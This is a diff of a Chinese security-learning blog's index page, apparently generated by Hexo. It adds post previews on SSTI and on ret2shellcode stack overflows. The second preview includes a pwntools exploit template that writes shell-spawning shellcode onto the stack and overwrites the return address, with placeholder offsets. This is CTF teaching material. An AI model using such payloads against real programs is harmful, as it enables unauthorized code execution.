@@ -100,7 +100,7 @@
 			</ul>
 		</nav>
                                 <nav>
-    			总文章数 22
+    			总文章数 24
 		</nav>
 		<nav class="header-smart-menu">
 			
@@ -142,7 +142,7 @@
 			
 			
 			<div>
-				<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=260 height=52 src="//music.163.com/outchain/player?type=2&id=1866185395&auto=0&height=32"></iframe>
+				<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=260 height=52 src="//music.163.com/outchain/player?type=2&id=2110023759&auto=1&height=32"></iframe>
 			</div>
 			
 				
@@ -237,6 +237,209 @@
           </div>
           <div id="js-content" class="content-ll">
             
+
+  
+    <article id="post-模块注入-SSTI" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/" target="_blank">模块注入-SSTI</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/" class="archive-article-date">
+        <time datetime="2024-07-27T08:02:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-27</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+ 
+
+			<h3 id="SSTI漏洞原理"><a href="#SSTI漏洞原理" class="headerlink" title="SSTI漏洞原理"></a>SSTI漏洞原理</h3><h4 id="模块引擎"><a href="#模块引擎" class="headerlink" title="模块引擎"></a>模块引擎</h4><p>模板引擎是一种工具，用于将数据与预定义的模板结合，生成最终的文档，通常是HTML页面或其他文本格式。它们在Web开发中特别常见，用于动态生成页面内容，允许开发者将业务逻辑与界面展示分离，提高代码的可维护性和重用性。</p>
+	
+
+
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SSTI</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/webbug//" class="article-tag-list-link color2">webbug</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+    <article id="post-pwn栈溢出-ret2shellcode" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/" target="_blank">pwn栈溢出-ret2shellcode</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/" class="archive-article-date">
+        <time datetime="2024-07-22T02:59:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-22</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+ 
+
+	
+		<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>程序中没有shell，需要我们自己写一个shell进去</p>
+<h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>ret2shellcode需要我们控制程序执行shellcode代码。即shellcode目标就是在栈上写入我们布局好的shellcode，利用ret-address返回shellcode执行我们的shellcode代码</p>
+<p><em><strong>前提</strong></em>：没有开启NX保护</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust((0x... + 0x...) , <span class="string">b&#x27;a&#x27;</span>) + p64(0x.....)</span><br><span class="line"><span class="comment"># p.sendline(shellcode)</span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27; * (0x.. + 0x..) + p64(0x.....)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h3><p>暂时没有典型例子</p>
+
+	
+
+
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/pwn//" class="article-tag-list-link color4">pwn</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
 
   
     <article id="post-pwn栈溢出-ret2syscall" class="article article-type-post  article-index" itemscope itemprop="blogPost">
@@ -959,180 +1162,6 @@
 
 
   
-    <article id="post-Os-hackNos-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/Os-hackNos-1/" target="_blank">Os-hackNos-1</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/Os-hackNos-1/" class="archive-article-date">
-        <time datetime="2024-05-26T14:59:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-05-26</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<h2 id="vulnhub靶机练习-Os-hackNos-1"><a href="#vulnhub靶机练习-Os-hackNos-1" class="headerlink" title="vulnhub靶机练习-Os-hackNos-1"></a>vulnhub靶机练习-Os-hackNos-1</h2><p>靶场下载链接：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">https://www.vulnhub.com/entry/hacknos-os-hacknos,401/</a></p>
-	
-
-
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/Os-hackNos-1/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-    <article id="post-XSS漏洞的挖掘与分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank">XSS漏洞的挖掘与分析</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/" class="archive-article-date">
-        <time datetime="2024-05-21T06:57:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-05-21</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<h4 id="什么是XSS漏洞？"><a href="#什么是XSS漏洞？" class="headerlink" title="什么是XSS漏洞？"></a><strong>什么是XSS漏洞？</strong></h4><p>全称跨站脚本攻击，是web应用中的计算机安全漏洞，它允许恶意web用户将代码植入web网站里，给其它用户访问，当用户访问到有恶意代码的网站就会产生XSS攻击。</p>
-	
-
-
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">-XSS</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/webbug//" class="article-tag-list-link color2">webbug</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1270,15 +1299,19 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">kali</a>
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">-XSS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1294,10 +1327,6 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">pwn</a>
               </li>
              
@@ -1307,6 +1336,10 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">命令执行·</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
               </li>
              
               <li class="article-tag-list-item">
